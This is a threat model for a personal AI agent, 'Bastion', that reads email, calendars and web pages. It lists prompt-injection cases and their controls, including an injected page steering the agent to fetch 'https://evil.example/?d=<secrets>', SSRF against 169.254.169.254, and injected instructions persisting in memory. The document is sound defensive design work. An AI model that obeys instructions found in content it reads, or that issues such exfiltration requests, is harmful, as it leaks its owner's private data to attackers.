# Bastion Threat Model

Version 0.1, written before the first line of agent code so that the design follows from it.

## 1. What Bastion is

A personal agent that runs continuously on the owner's machine (or a small server they control).
The owner talks to it over Telegram and a local CLI. It can read and draft email (Gmail), read and
manage calendar events (Google Calendar), search and read the web, remember facts, and run
scheduled tasks without the owner present.

## 2. Core assumption

> **The language model is not a security boundary.**

Any text the model reads can steer it: an email, a web page, a calendar invite, a search snippet,
even a stored memory. No current model reliably resists prompt injection. Bastion therefore treats
the model as an **untrusted planner**: it may *propose* actions, but deterministic code outside
the model decides whether each action is allowed, needs approval, or is refused.

## 3. Assets

| Asset | Why it matters |
|---|---|
| Email contents and contacts | Private, and a lever for fraud and phishing |
| Calendar data | Reveals location, routine, associates |
| Ability to send email as the owner | Impersonation, fraud, reputational harm |
| OAuth refresh tokens, LLM API keys, Telegram bot token | Long-lived account access, billing abuse |
| Agent memory | Personal facts; also a persistence vector for injected instructions |
| Audit log | The owner's only reliable record of what the agent did |
| Host machine and local network | Pivot target via SSRF |

## 4. Adversaries

| Adversary | Capability |
|---|---|
| **A1. Content attacker** (most likely) | Can put text in front of the agent: sends the owner an email, a calendar invite, or controls a web page the agent reads. Cannot talk to the agent directly. |
| **A2. Stranger on Telegram** | Finds the bot's username and messages it. |
| **A3. Telegram account hijacker** | Controls the owner's Telegram session (SIM swap, stolen device, session theft). |
| **A4. Malicious or compromised dependency** | Code running inside the Bastion process via a poisoned package. |
| **A5. Local attacker / malware** | Read access to the owner's user files. |
| **A6. Compromised LLM provider** | Sees prompts; can return arbitrary responses. |

## 5. Trust boundaries

```
 [Owner] ──Telegram/CLI──► (B1) ──► Bastion core ──► (B3) ──► LLM provider API
                                       │   ▲
                                       │   └── (B2) untrusted content: email bodies, web pages,
                                       │            calendar invites from others, search results
                                       ▼
                             (B4) tool execution ──► Gmail / Calendar / Web
                                       │
                             (B5) local state: SQLite, audit log, OS keyring
```

- **B1** Owner input. Trusted *only* after channel authentication (Telegram user-ID allowlist, local CLI user).
- **B2** Untrusted content. Never trusted, regardless of how it arrived.
- **B3** LLM. Output is untrusted: a proposal, not a command.
- **B4** Side effects. Every crossing passes the policy engine.
- **B5** Local state. Secrets live only in the OS keyring; other sensitive fields are encrypted.

## 6. The lethal trifecta

An agent is exploitable for data theft when it combines **(1) access to private data**, **(2)
exposure to untrusted content**, and **(3) a channel to send data out**. Bastion has all three by
design: that is what a useful personal agent is. It cannot remove any leg entirely, so it
**breaks the chain at runtime**: once untrusted content has entered a turn (taint), every
outbound channel (send email, fetch a URL the model composed, create an invite with external
attendees) is either blocked or requires the owner's explicit, argument-bound approval.

## 7. Threats and controls (STRIDE)

| ID | Threat | STRIDE | Adversary | Controls |
|---|---|---|---|---|
| T1 | Injected email makes the agent forward private mail to the attacker | Info disclosure | A1 | Taint tracking (C2), policy escalation to approval (C1, C4), quarantined reader (C3) |
| T2 | Injected web page makes the agent fetch `https://evil.example/?d=<secrets>` | Info disclosure | A1 | URL-provenance rule: `web_fetch` only accepts URLs seen in search results or owner messages (C7) |
| T3 | Agent tricked into fetching `http://169.254.169.254/` or LAN admin pages | Info disclosure / EoP | A1 | SSRF guard: resolve, reject private/loopback/link-local/reserved ranges, pin IP, re-check redirects (C7) |
| T4 | Injected text makes the agent delete mail or calendar events | Tampering | A1 | `destructive` tier: approval plus TOTP step-up (C1, C4, C5) |
| T5 | Owner approves "send to alice@" but the agent sends to someone else | Tampering | A1 | Approval bound to a hash of the exact tool arguments; single use; expiring (C4) |
| T6 | Stranger commands the bot | Spoofing / EoP | A2 | Owner user-ID allowlist set via a one-time CLI pairing code; others silently dropped and audited (C6) |
| T7 | Hijacked Telegram approves high-risk actions | Spoofing | A3 | TOTP step-up for high-risk tiers (C5); `/stop` kill switch and CLI-side revocation |
| T8 | Injected instruction stored in memory and replayed in every future session | Tampering (persistence) | A1 | Memory provenance; tainted memories are labelled as data and never placed in the instruction area (C12) |
| T9 | Secrets leak into logs, audit entries, or model context | Info disclosure | A1, A5 | Keyring-only storage (C8); redaction filter on all log and audit output (C8); tools never return credentials |
| T10 | Token theft from disk | Info disclosure | A5 | OS keyring (C8); AES-GCM field encryption for sensitive DB fields (C13) |
| T11 | Over-broad Google access amplifies any compromise | EoP | All | Minimal OAuth scopes; `gmail.send` opt-in (C9) |
| T12 | Owner cannot tell what the agent did, or evidence is edited | Repudiation | A1, A5 | Hash-chained audit log with `bastion audit verify` (C10) |
| T13 | Scheduled task loops, burns money, or drifts beyond its purpose | DoS / EoP | A1 | Capability grants, step/token/cost budgets, rate limits, kill switch (C11) |
| T14 | Poisoned dependency | All | A4 | Hash-locked dependencies, minimal dependency tree, pip-audit, Dependabot, CodeQL, SBOM, signed releases (C14) |
| T15 | Malicious tool-call arguments (wrong types, path tricks, header injection) | Tampering | A1 | Every tool's arguments validated by a strict Pydantic schema before policy evaluation |
| T16 | Exposed network listener attacked | EoP | A2 | No inbound ports: Telegram long polling; the CLI runs in-process (no local IPC server) |

## 8. Controls index

C1 policy engine (default-deny, risk tiers) · C2 taint tracking · C3 quarantined reader ·
C4 argument-bound approvals · C5 TOTP step-up · C6 Telegram lockdown · C7 egress guard ·
C8 secrets vault and redaction · C9 least-privilege OAuth · C10 tamper-evident audit log ·
C11 autonomy guardrails · C12 memory provenance · C13 encryption at rest · C14 supply chain ·
C15 red-team eval suite (verifies C1 to C13 against a corpus of attacks).

## 9. Accepted risks and non-goals

- **A6, a malicious LLM provider,** sees everything in the prompt. Mitigation is provider choice
  (including fully local models through any OpenAI-compatible server). Bastion does not encrypt
  prompts from the provider.
- **A5 with code execution as the owner** can read the keyring and memory of the running process.
  Defending against a fully compromised user account is out of scope.
- **Information disclosed in replies to the owner** is by design: if the owner asks "summarise my
  inbox", the summary contains private data. The goal is that data only flows to the owner.
- **Approval fatigue.** If the owner approves everything without reading, approvals don't help.
  Bastion mitigates this by keeping approvals rare (read actions never prompt), showing exact
  diffs, and requiring TOTP only for the highest tier.
- **Shell and code execution and browser automation** are deliberately excluded from v1.

## 10. How this document is kept honest

Every control above has tests in `tests/security/` that try to break it. The red-team eval suite
(Phase 5) runs a corpus of injection attacks end to end and publishes the attack-success rate in
the README. A control without a failing-then-passing attack test is not considered implemented.
